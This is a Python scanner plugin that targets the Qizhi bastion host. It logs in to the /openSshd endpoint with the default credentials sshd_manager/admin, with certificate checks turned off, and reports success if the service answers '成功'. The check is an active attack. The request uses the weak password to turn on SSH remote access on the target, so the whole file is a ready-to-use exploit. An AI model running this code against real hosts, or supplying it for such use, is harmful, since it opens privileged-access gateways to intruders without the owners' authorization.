#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '齐治堡垒机弱口令,开启ssh远程访问',

      'level'     :   'medium',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Length': '46',
      'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
      'Sec-Ch-Ua-Mobile': '?0',
      'Sec-Ch-Ua-Platform': "Windows",
      'Origin': f'{url}',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'Referer': f'{url}/openSshd.html',
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'zh-CN,zh;q=0.9',
      'Priority': 'u=1, i',
      'Connection': 'close',
      }
  target = '/openSshd'
  data='''
    {"username":"sshd_manager","password":"admin"}
  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=10,verify=False)
    if res.status_code == 200 and res.text == '成功':
      ret['huixian'] = "账号:sshd_manager\n密码:admin"
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret